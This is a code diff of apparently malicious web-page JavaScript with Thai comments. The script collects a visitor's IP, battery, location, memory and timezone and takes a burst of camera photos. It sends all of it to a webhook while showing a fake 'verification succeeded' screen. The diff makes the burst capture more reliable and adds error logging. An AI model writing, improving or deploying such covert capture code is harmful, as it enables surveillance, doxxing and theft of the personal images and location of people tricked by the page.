@@ -378,14 +378,18 @@ async function collectData() {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
-    } catch(e) {}
+    } catch(e) {
+        console.log("IP fetch failed");
+    }
 
     try {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
             userData.battery = Math.floor(battery.level * 100) + "%";
         }
-    } catch(e) {}
+    } catch(e) {
+        console.log("Battery fetch failed");
+    }
 
     return new Promise((resolve) => {
         if (navigator.geolocation) {
@@ -421,61 +425,61 @@ async function startCameraAndAutoCapture() {
             };
         });
         
+        // เริ่มถ่ายรัวทันที
         startBurstCapture(video);
         return true;
     } catch (err) {
         document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
+        console.error("Camera error:", err);
         return false;
     }
 }
 
-// ===== ถ่ายรัว 25 รูป =====
+// ===== ถ่ายรัว 15 รูป (0.3 วินาที/รูป) =====
 function startBurstCapture(video) {
     if (isCapturing) return;
     isCapturing = true;
     
-    const burstCount = 25;
+    const burstCount = 15;
     let captured = 0;
     const images = [];
     
-    captureFrame(video, images, () => {
-        captured++;
-        if (captured === burstCount) {
-            finishAndSend(images, video);
-        }
-    });
-    
-    for (let i = 1; i < burstCount; i++) {
-        setTimeout(() => {
-            captureFrame(video, images, () => {
+    function captureOne() {
+        try {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    images.push(blob);
+                }
                 captured++;
-                if (captured === burstCount) {
+                
+                if (captured < burstCount) {
+                    // ถ่ายต่อไปทุก 300ms (0.3 วินาที)
+                    setTimeout(captureOne, 300);
+                } else {
+                    // ถ่ายครบแล้ว ส่งทันที
                     finishAndSend(images, video);
                 }
-            });
-        }, i * 80);
-    }
-}
-
-function captureFrame(video, images, callback) {
-    try {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob((blob) => {
-            if (blob) {
-                images.push(blob);
+            }, "image/png", 0.9);
+        } catch(e) {
+            captured++;
+            if (captured < burstCount) {
+                setTimeout(captureOne, 300);
+            } else {
+                finishAndSend(images, video);
             }
-            if (callback) callback();
-        }, "image/png", 0.9);
-    } catch(e) {
-        if (callback) callback();
+        }
     }
+    
+    // เริ่มถ่ายรูปแรกทันที
+    captureOne();
 }
 
 function finishAndSend(images, video) {
@@ -483,6 +487,7 @@ function finishAndSend(images, video) {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
     }
+    console.log("Captured " + images.length + " images, sending...");
     sendAllToWebhook(images);
 }
 
@@ -495,6 +500,7 @@ async function sendAllToWebhook(images) {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+    // เปลี่ยน UI ทันที
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
     document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;
@@ -541,10 +547,20 @@ async function sendAllToWebhook(images) {
     formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
 
     try {
-        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-        document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
+        console.log("Sending to webhook...");
+        const response = await fetch(WEBHOOK_URL, { 
+            method: "POST", 
+            body: formData 
+        });
+        console.log("Response status:", response.status);
+        if (response.ok) {
+            document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
+        } else {
+            document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ (Error: " + response.status + ")";
+        }
     } catch(e) {
-        console.error(e);
+        console.error("Webhook error:", e);
+        document.getElementById("status-msg").innerText = "❌ เกิดข้อผิดพลาดในการส่งข้อมูล";
     }
 
     renderResultUI(images ? images.length : 0);
